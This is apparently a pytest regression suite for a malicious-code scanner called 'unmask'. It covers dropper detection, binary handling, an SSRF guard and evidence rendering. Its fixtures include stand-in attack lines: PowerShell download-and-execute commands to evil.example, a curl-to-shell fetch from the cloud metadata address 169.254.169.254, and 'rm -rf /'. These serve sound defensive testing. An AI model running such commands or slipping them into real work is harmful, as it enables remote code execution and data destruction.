"""Regression tests for the code-review fixes (see the review findings)."""

from __future__ import annotations

import ipaddress
import json
import sqlite3
from pathlib import Path

import pytest

from unmask import MCDConfig, run_mcd
from unmask.scanner.compose import compose_mcd
from unmask.scanner.observe import observe


def _toolchain_with(*providers):
    from unmask.providers import ProviderInfo, ToolchainStatus
    st = ToolchainStatus()
    for p in providers:
        st.providers.append(ProviderInfo(id=p.id, capabilities=list(p.capabilities),
                                         source="test", instance=p))
    return st


def _bin_status(run_dir, target):
    c = sqlite3.connect(Path(run_dir) / "run.db")
    c.row_factory = sqlite3.Row
    try:
        row = c.execute("select status, error from work_items where operation='scan-binary' "
                        "and target=?", (target,)).fetchone()
        return (row["status"], row["error"]) if row else (None, None)
    finally:
        c.close()


# --- #1 / #7  dataflow inline/helper FPs -----------------------------------

def test_fetch_keyword_in_string_literal_is_not_a_dropper(tmp_path):
    (tmp_path / "a.py").write_text('exec("import requests; requests.get(healthcheck)")\n')
    obs, inv = observe(str(tmp_path))
    assert "BP-DROPPER" not in {f.get("composition") for f in compose_mcd(obs, inv)}


def test_source_helper_passed_as_value_is_not_a_dropper(tmp_path):
    (tmp_path / "a.py").write_text(
        "import subprocess, requests\n"
        "def download(u):\n    return requests.get(u)\n"
        'subprocess.run(["ls"], env={"X": download})\n')
    obs, inv = observe(str(tmp_path))
    assert "BP-DROPPER" not in {f.get("composition") for f in compose_mcd(obs, inv)}


# --- #2  download-command rule is case-insensitive -------------------------

@pytest.mark.parametrize("cmd", [
    "IWR https://evil.example/x.ps1 | iex",
    "invoke-webrequest https://evil.example/x | iex",
    "$c=(New-Object NET.WEBCLIENT).DownloadString('http://evil/x'); iex $c",
])
def test_download_rule_case_insensitive(tmp_path, cmd):
    (tmp_path / "d.ps1").write_text(cmd + "\n")
    obs, inv = observe(str(tmp_path))
    assert "NETW.HTTP" in {o.atom for o in obs}
    assert "BP-DROPPER" in {f.get("composition") for f in compose_mcd(obs, inv)}


# --- #4  an empty (error-free) transform result must NOT claim 'done' -------

class _EmptyBinaryProvider:
    id = "fake-empty"
    capabilities = ["decompile-native", "binary-triage"]

    def can_handle(self, artifact):
        return True

    def transform(self, artifact, workdir):
        from unmask.transform import TransformResult
        return TransformResult(provider_id=self.id, artifact=artifact.logical_path,
                               capability="decompile-native", note="nothing recovered")


def test_empty_transform_result_defers_binary(tmp_path, monkeypatch):
    import unmask.run as runmod
    monkeypatch.setattr(runmod, "discover_providers", lambda: _toolchain_with(_EmptyBinaryProvider()))
    tgt = tmp_path / "pkg"
    tgt.mkdir()
    (tgt / "x.so").write_bytes(b"\x7fELF" + b"\x00" * 40)
    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd")))
    status, _ = _bin_status(result.run_dir, "x.so")
    assert status == "deferred"  # NOT 'done' — nothing was recovered
    assert result.blocked_binaries == 0


# --- #8  a provider that can't do binaries => deferred, not 'install unmask-re' --

class _DeobfOnlyProvider:
    id = "fake-deobf-only"
    capabilities = ["deobfuscate-js"]

    def can_handle(self, artifact):
        return artifact.kind == "obfuscated-source"

    def transform(self, artifact, workdir):
        from unmask.transform import TransformResult
        return TransformResult(provider_id=self.id, artifact=artifact.logical_path, capability="deobfuscate-js")


def test_deobf_only_provider_defers_binary(tmp_path, monkeypatch):
    import unmask.run as runmod
    monkeypatch.setattr(runmod, "discover_providers", lambda: _toolchain_with(_DeobfOnlyProvider()))
    tgt = tmp_path / "pkg"
    tgt.mkdir()
    (tgt / "x.so").write_bytes(b"\x7fELF" + b"\x00" * 40)
    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd")))
    status, error = _bin_status(result.run_dir, "x.so")
    assert status == "deferred" and result.blocked_binaries == 0
    assert error is None or "install unmask-re" not in (error or "")


# --- #3  a network-blocked fetch must not inflate the binary blind-spot count --

def test_blocked_fetch_does_not_count_as_binary(tmp_path, monkeypatch):
    import unmask.net as netpkg
    from unmask.net import FetchResult

    def _blocked(url, dest_dir, policy=None, *, resolver=None):
        return FetchResult(url=url, blocked_reason="non-public-address: 169.254.169.254")

    monkeypatch.setattr(netpkg, "fetch", _blocked)
    tgt = tmp_path / "pkg"
    tgt.mkdir()
    (tgt / "setup.sh").write_text("#!/bin/sh\ncurl -fsSL http://169.254.169.254/x | sh\n")
    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd"), network="fetch-only"))
    report = json.loads(Path(result.report_paths["json"]).read_text())
    assert result.blocked_binaries == 0
    assert (report["summary"].get("blockedBinaries") or 0) == 0


# --- #11  resume with a corrupt config must fail cleanly, not leak/TypeError --

def test_resume_corrupt_config_raises_cleanly(tmp_path):
    from unmask import resume_mcd
    tgt = tmp_path / "pkg"
    tgt.mkdir()
    (tgt / "a.py").write_text("x=1\n")
    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd")))
    db = Path(result.run_dir) / "run.db"
    c = sqlite3.connect(db)
    c.execute("update runs set config_json=? where id=?",
              (json.dumps({"bogus_field_that_does_not_exist": 1}), result.run_id))
    c.commit()
    c.close()
    with pytest.raises(ValueError):  # clean ValueError, not a raw TypeError
        resume_mcd(result.run_dir)


# --- #14  ingest line coercion ---------------------------------------------

def test_ingest_line_coercion():
    from unmask.scanner.signatures import Signatures
    from unmask.transform import ingest_atoms
    fams = Signatures.load_vendored().known_families()
    recs = [
        {"atom": "NETW.HTTP", "path": "a", "line": 42},        # int -> 42
        {"atom": "NETW.HTTP", "path": "b", "line": "43"},      # numeric str -> 43
        {"atom": "NETW.HTTP", "path": "c", "line": 44.0},      # float -> 44
        {"atom": "NETW.HTTP", "path": "d", "line": True},      # bool -> None (not 1)
    ]
    obs, _ = ingest_atoms(recs, origin="o", known_families=fams)
    lines = [o.line for o in obs]
    assert lines == [42, 43, 44, None]


# --- #9  .pyc is a first-class binary kind ---------------------------------

def test_pyc_is_a_binary_kind():
    from unmask.inventory.tree import BINARY_KINDS, classify_kind
    assert classify_kind(Path("mod.pyc")) == "pyc"
    assert "pyc" in BINARY_KINDS


# --- #12  the SSRF guard exposes the validated IPs for connection pinning ---

def test_check_url_returns_validated_public_ips():
    from unmask.net.guard import check_url
    ok, reason, addrs = check_url("https://example.com/x",
                                  resolver=lambda h: [ipaddress.ip_address("93.184.216.34")])
    assert ok and reason == "" and [str(a) for a in addrs] == ["93.184.216.34"]
    ok2, reason2, addrs2 = check_url("https://rebind.evil/x",
                                     resolver=lambda h: [ipaddress.ip_address("10.0.0.1")])
    assert not ok2 and addrs2 == [] and "non-public" in reason2


# --- evidence tiering: a decoded payload is dispositive and never clipped ----

def test_is_recovered_distinguishes_decoded_from_raw_matches():
    from unmask.reviewers.agent import is_recovered
    assert is_recovered("recovered concealed string via constant-key XOR (key=91): evil.com")
    assert is_recovered("decoded base64 payload: rm -rf /")
    assert not is_recovered("var __create=Object.create;")          # raw compiler helper
    assert not is_recovered('var lookup="ABCDEFGHabcd0123+/";')     # base64 alphabet table
    assert not is_recovered("")


def test_render_evidence_surfaces_recovered_unclipped_and_clips_supporting():
    """The de-escalation fix: a recovered payload (a decoded fact) is shown in full and
    marked dispositive, ahead of clipped supporting matches — so benign bulk can't
    outvote it. A minified megaline of raw match is still clipped."""
    from unmask.reviewers.agent import render_evidence
    big_recovered = "recovered concealed string via XOR: " + "evil.example," * 5000
    big_supporting = "var __create=" + "a" * 5000  # huge raw pattern match
    out = "\n".join(render_evidence([
        {"id": "obs-1", "atom": "XFRM.BITWISE", "location": {"path": "a.js", "line": 1},
         "evidence": big_recovered},
        {"id": "obs-2", "atom": "XFRM.BITWISE", "location": {"path": "a.js", "line": 1},
         "evidence": big_supporting},
    ]))
    assert "RECOVERED PAYLOADS" in out and "DISPOSITIVE" in out
    assert big_recovered in out                        # recovered fact: never clipped
    assert "Supporting matches" in out
    assert big_supporting not in out and "chars clipped]" in out   # supporting: clipped
    assert out.index("RECOVERED PAYLOADS") < out.index("Supporting matches")  # dispositive first
